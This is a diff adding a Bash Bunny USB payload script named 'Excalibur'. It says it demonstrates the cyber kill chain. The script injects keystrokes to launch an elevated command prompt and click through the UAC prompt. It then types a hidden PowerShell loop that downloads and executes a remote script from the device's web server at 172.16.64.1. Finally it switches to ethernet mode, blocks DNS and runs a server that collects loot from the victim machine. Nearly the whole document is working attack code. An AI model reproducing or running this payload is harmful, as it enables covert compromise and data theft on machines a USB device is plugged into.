@@ -1,0 +1,71 @@
+#!/bin/bash
+#		     .-.
+#           (0.0)
+#         '=.|m|.='
+#         .='/@\`=.
+#            @8@
+#        _   8@8   _
+#       (@__/@8@\__@)
+#        `-=:8@8:=-'
+#            |:|
+#            |:|
+#            |:|
+#            |:|
+#            |:|
+#            |:|
+#            |:|
+#            |:|
+#            |:|
+#            |:|
+#            |:|
+#            |:|
+#            \:/
+#             ^
+# 
+# Title:         Excalibur
+# Author:        Dviros, Dora
+# Version:       1.0
+#
+# Excalibur is an APT based "Powershell" for the Bashbunny project.
+# Its purpose is to reflect on how a "simple" USB drive can execute the 7 cyber kill chain.
+
+
+
+LED SETUP
+# Creating Loot Folders
+LOOTDIR=/root/udisk/loot/Excalibur
+mkdir -p $LOOTDIR
+SWITCHDIR=/root/udisk/payloads/$SWITCH_POSITION
+mkdir -p $SWITCHDIR/loot
+
+# HID Attack Starts
+ATTACKMODE HID
+# UAC Bypass
+LED STAGE1
+RUN WIN powershell -c "Start-Process cmd -verb runas"
+Q DELAY 250
+Q ENTER
+Q DELAY 1500
+Q LEFTARROW
+Q DELAY 500
+Q ENTER
+Q DELAY 1500
+
+LED STAGE2 
+#Powershell Payload: first wait for connection to bunny webserver, then pull scripts and upload results
+Q STRING "powershell -W Hidden \"while (\$true) {If (Test-Connection 172.16.64.1 -count 1) {IEX (New-Object Net.WebClient).DownloadString('http://172.16.64.1/p_v2.ps1');exit}}\""
+Q DELAY 300
+Q ENTER
+# Ethernet Attack Starts
+ATTACKMODE RNDIS_ETHERNET
+LED SPECIAL1
+# mount -o sync /dev/nandf /root/udisk
+
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python $SWITCHDIR/server.py
+
+
+#Wait for EOF in loot folder
+LED SPECIAL2
+sleep 60
+done
